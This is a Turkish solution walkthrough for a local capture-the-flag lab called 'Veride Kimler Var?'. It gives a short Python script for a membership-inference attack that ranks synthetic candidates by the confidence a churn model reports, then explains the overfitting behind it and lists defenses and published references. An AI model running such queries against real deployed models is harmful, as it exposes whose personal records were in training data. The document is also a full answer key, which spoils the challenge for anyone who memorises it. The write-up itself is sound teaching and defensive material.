# Veride Kimler Var? çözüm anlatımı

> ⚠️ Bu dosya çözümün tamamını içerir.

## Senaryo özeti

RetailCo, sadakat programı üyeleriyle bir müşteri kaybı modeli eğitti ve
API'nin kimin üye olduğu hakkında hiçbir şey açık etmediğini söylüyor.
`candidates.csv` içindeki 20 adaydan tam 5'i eğitim kümesindeydi. Onları yalnız
API'yi kullanarak belirleyiniz. Bütün kayıtlar sentetiktir.

## Keşif

```bash
tensorgoat create whos_in_the_data
curl http://127.0.0.1:8105/
```

- `candidates.csv` dosyasında `candidate_id`, altı öznitelik ve `churned`
  sütunu (o müşteriye gerçekte ne olduğu) vardır.
- `POST /predict`, `churn_probability` ve `confidence` döndürür.
- `POST /submit_members`, beş kimliklik tam bir küme için yalnız doğru ya da
  yanlış der ve dakikada 10 denemeye izin verir. 20 kişiden 5'i 15.504 ayrı
  biçimde seçilebilir, bu yüzden tahmin etmek umutsuzdur. Bilgi `/predict`
  uç noktasından gelmelidir.

## Saldırı (adım adım, kod parçalarıyla)

Modele her adayı sorunuz ve ne kadar emin olduğunu karşılaştırınız.

```python
import csv, httpx

URL = "http://127.0.0.1:8105"
names = httpx.get(URL).json()["features"]
rows = list(csv.DictReader(open("candidates.csv", encoding="utf-8")))

results = []
for r in rows:
    out = httpx.post(f"{URL}/predict", json={"features": [float(r[n]) for n in names]}).json()
    results.append((out["confidence"], r["candidate_id"], out["churn_probability"], r["churned"]))

for line in sorted(results, reverse=True):
    print(line)
```

Sıralı çıktı iki kümeye ayrılır.

```
(1.0,    'C-....', 1.0,    '1')
(1.0,    'C-....', 0.0,    '0')
(1.0,    'C-....', 0.0,    '0')
(1.0,    'C-....', 1.0,    '1')
(1.0,    'C-....', 0.0,    '0')
(0.8167, 'C-....', 0.1833, '1')     <- buradan sonrası belirgin biçimde düşük
(0.75,   'C-....', 0.75,   '0')
...
```

Beş adayın güven değeri 1.0 çıkar ve tahmin onlara gerçekte olanla uyuşur.
Öteki herkes için model belirgin biçimde daha az emindir ve sık sık yanılır. İlk
beşi gönderiniz.

```python
members = [cid for _, cid, _, _ in sorted(results, reverse=True)[:5]]
print(httpx.post(f"{URL}/submit_members", json={"candidate_ids": members}).json())
```

Biraz daha özenli bir yol (`solve.py` bunu kullanır), adayları modelin `churned`
sütunundaki *gerçek* sonuca verdiği olasılığa göre sıralar. Burada iki sıralama
da aynı beş kişiyi verir.

## Neden işe yarıyor

Model, çok küçük bir veri kümesinde önyükleme örneklemesi (bootstrap) olmadan
eğitilmiş, sonuna kadar büyütülmüş ağaçlardan oluşan bir rastgele ormandır. Her
ağaç, her eğitim kaydı kendi saf yaprağına düşene kadar bölünmeyi sürdürür.
Orman eğitim kümesini **ezberlemiştir**. Bir eğitim kaydını sorduğunuzda bütün
ağaçlar doğru yanıtta birleşir. Hiç görmediği benzer bir kişiyi sorduğunuzda
ağaçlar ayrışır.

"Görülmüş" ve "görülmemiş" girdiler arasındaki bu davranış farkı saldırının
tamamıdır. Buna **üyelik çıkarımı** (membership inference) denir ve yan kanal
güven değeridir. Belirli bir kişinin kaydının bir eğitim kümesinde olduğunu
bilmek kendi başına hassas olabilir (burada bir sadakat programının üyeleri,
daha az masum durumlarda bir kliniğin hastaları ya da bir borç servisinin
müşterileri).

Gerçek sistemlerde fark nadiren bu kadar temizdir. Saldırganlar o zaman çok
sayıda sorgu üzerinde istatistik kullanır ya da üye olan ve olmayan çıktıların
neye benzediğini öğrenmek için "gölge modeller" eğitir. İlke aynıdır, aşırı
öğrenme üyeliği sızdırır.

## Önlem / Savunma

- **Aşırı öğrenmeyi azaltınız.** Kök neden budur. Ağaç derinliğini
  sınırlayınız, yaprak başına en az örnek sayısı koyunuz, önyükleme örneklemesi
  kullanınız, düzenlileştiriniz, daha çok veriyle eğitiniz ve eğitim
  doğruluğunu ayrılmış veri doğruluğuyla karşılaştırınız. İkisi arasındaki
  büyük fark, nitelik sorunu olduğu kadar bir gizlilik uyarısıdır.
- **Daha az ayrıntı döndürünüz.** Çağırana tam olasılık yerine bir etiket ya da
  kaba bir puan aralığı veriniz. Bu, yan kanalı daraltır. Yalnız etiketle
  çalışan saldırılar da vardır, bu yüzden bunu eksiksiz çözüm saymayınız.
- **Üyeliğin kendisi hassassa diferansiyel gizlilikle eğitiniz.** DP-SGD ya da
  diferansiyel gizlilikli ağaç toplulukları örnek verilebilir. Tek bir kaydın
  modeli ne kadar etkileyebileceğine ölçülebilir bir sınır getirir.
- **Yayımlamadan önce sınayınız.** Kendi modelinize, üyeliği bilinen kayıtlarla
  bir üyelik çıkarımı sınaması uygulayınız ve saldırının başarı oranını yayın
  ölçütü olarak izleyiniz.
- **Erişimi denetleyiniz ve izleyiniz.** Çağıranların kimliğini doğrulayınız,
  `/predict` için kimlik başına hız sınırı koyunuz ve belirli kişilerin
  kayıtlarını sorgulayan istemcileri arayınız.
- **Veriyi en aza indiriniz.** Görev için gerekmeyen kayıtlar eğitim kümesinde
  hiç bulunmamalıdır.

## Gerçek dünyadan kaynaklar

- Shokri ve arkadaşları, "Membership Inference Attacks Against Machine Learning
  Models" (IEEE S&P 2017). <https://arxiv.org/abs/1610.05820>
- Yeom ve arkadaşları, "Privacy Risk in Machine Learning: Analyzing the
  Connection to Overfitting" (2018). <https://arxiv.org/abs/1709.01604>
- OWASP Machine Learning Security Top 10, ML04:2023 Membership Inference
  Attack. <https://owasp.org/www-project-machine-learning-security-top-10/>
- MITRE ATLAS, "Infer Training Data Membership" tekniği.
  <https://atlas.mitre.org/>
